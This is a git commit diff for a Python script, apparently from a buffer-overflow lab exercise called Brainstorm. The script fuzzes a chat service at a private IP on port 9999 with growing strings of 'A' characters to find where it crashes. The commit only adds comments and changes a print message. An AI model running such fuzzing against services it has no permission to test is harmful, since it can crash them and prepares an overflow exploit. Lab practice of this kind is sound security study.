1c38472df2ef860a5e9a420e9ecd179a50dc5ad5
Roger <roger.bergling@invid.se>
2021-01-21 08:56:58 +0100

    Update fuzz script for Brainstorm to add description

--- Brainstorm/fuzz.py
+++ Brainstorm/fuzz.py
@@ -1,9 +1,9 @@
 import socket, time, sys
-
+#Connection to target
 ip = "172.21.21.28"
 port = 9999
 timeout = 5
-
+#Creat how the payload will be a a alot of A
 buffer = []
 counter = 100
 while len(buffer) < 70:
@@ -12,7 +12,7 @@ while len(buffer) < 70:
 
 for string in buffer:
     try:
-        print("Fuzzing Chat with %s bytes") % len(string)
+        print("Login with user name roger and fuzzing Chat with %s bytes") % len(string)
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.settimeout(timeout)
         connect = s.connect((ip, port))
@@ -23,10 +23,10 @@ for string in buffer:
         #Sending the "A" charactes as a message Because fuzzing username did not work
         s.send(string)
         s.recv(1024)
-        #waiting 1 second before continuing
+        #Waiting 1 second before continue
         time.sleep(1)
         s.close()
-
+    #When the application hangs/crash print out message
     except:
         print("Could not connect to " + ip + ":" + str(port))
         sys.exit(0)
